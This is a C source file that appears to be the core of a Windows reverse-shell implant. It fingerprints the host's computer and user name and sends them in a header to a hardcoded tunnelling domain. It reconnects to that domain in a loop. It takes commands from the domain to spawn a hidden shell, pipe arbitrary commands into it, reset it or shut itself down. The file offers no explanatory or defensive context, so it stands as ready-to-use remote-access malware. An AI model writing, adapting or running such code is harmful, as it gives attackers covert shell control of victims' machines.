#include "Websocket.h"
#include "Shell.h"
//#include "DynamicBuffer.h"

/*
int main(){
    DYNBUF_INFO command;
    REQINFO reqInfo;

    DynBuf_Init(20,&command);

    if (!StartWebsocket(L"localhost",80,L"/terminal",&reqInfo)){
        printf("Failed To Connect");
        cleanUPReq(&reqInfo);
        return 0;
    }

    if(!WebSocketReadDataAsString(&reqInfo,&command)){
        printf("Failed To Receive Data");
        cleanUPReq(&reqInfo);
        return 0;
    }
    else{
        DynBuf_PrintInfo(&command);
    }

    DynBuf_Free(&command);
    cleanUPReq(&reqInfo);
    return 0;
}
*/


void AddIdentiyHeader(PDYNBUF_INFO Headers){
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerNameSize = sizeof(computerName);

   
    char userName[256];
    DWORD userNameSize = sizeof(userName);

    GetComputerNameA(computerName, &computerNameSize);
    GetUserNameA(userName, &userNameSize);

    DynBuf_Join_AnsiTowide(Headers,"X-Identity: ","en_US.UTF-8");
    DynBuf_Join_AnsiTowide(Headers,computerName,"en_US.UTF-8");
    DynBuf_Join_AnsiTowide(Headers,"\\","en_US.UTF-8");
    DynBuf_Join_AnsiTowide(Headers,userName,"en_US.UTF-8");
    DynBuf_Join_AnsiTowide(Headers,"\r\n","en_US.UTF-8");
}

int main(){
    DYNBUF_INFO command,Headers;
    ReadShellOutPutThread shellInfo = {0};
    
    
	
    
    
	
    REQINFO reqInfo = {0};
    BOOL keepRunningMain = 1, keepRunningChild = 0 , isShellRunning = 0;
    DynBuf_Init(20,&command);
    DynBuf_Init(20*sizeof(wchar_t),&Headers);
    
    
    
	
    AddIdentiyHeader(&Headers);
    DynBuf_Join_AnsiTowide(&Headers,"localtonet-skip-warning: 1\r\n","en_US.UTF-8"); // for localtonet Service
    
    
    while (keepRunningMain)
    {
        if (!StartWebsocket(L"78agdpy.localto.net", 443, L"/terminal", &reqInfo,&Headers))
        {
            printf("Failed To Connect\n");
            cleanUPReq(&reqInfo);
            Sleep(10000);
        }
        else{
            keepRunningChild = 1;
        }

        while (keepRunningChild)
        {
            if (!WebSocketReadDataAsString(&reqInfo, &command))
            {
                //printf("Failed To Receive Data\n");
                cleanUPReq(&reqInfo);
                keepRunningChild = 0;
            }
            else
            {
                DynBuf_PrintInfo(&command);

                if (command.length > 0)
                {
                    if (!strncmp("KillYourSelf", command.data, command.length))
                    {
                        keepRunningChild = 0;
                        keepRunningMain = 0;
                    }

                    else if (!strncmp("SpawnShell", command.data, command.length))
                    {
                        shellInfo.reqInfo = &reqInfo;

                        if (!isShellRunning)
                        {
                            if (!SpawnShell(&shellInfo))
                            {
                                // printf("Failed To Spwan Shell");
                                CleaupShell(&shellInfo);
                            }
                            else
                            {
                                printf("Process id %ld\n", shellInfo.processInfo.dwProcessId);
                                isShellRunning = 1;
                            }
                        }
                    }

                    else if (!strncmp("ResetShell", command.data, command.length))
                    {

                        CleaupShell(&shellInfo);
                        isShellRunning = 0;
                    }

                    else
                    {

                        if (isShellRunning && (command.length != 0))
                        {
                            // DynBuf_Join(&command,"\n\n",2);
                            if(command.data[command.length-1] != 0x0a){
                            	DynBuf_Join(&command, "\n", 1);
							}
                            
                            WriteToShell(shellInfo.StdInPipe[1], &command);
                        }
                    }
                }

                DynBuf_Assign(&command,NULL,0);
            }
        }
    }

    DynBuf_Free(&command);
    CleaupShell(&shellInfo);
    cleanUPReq(&reqInfo);
    return 0;
}
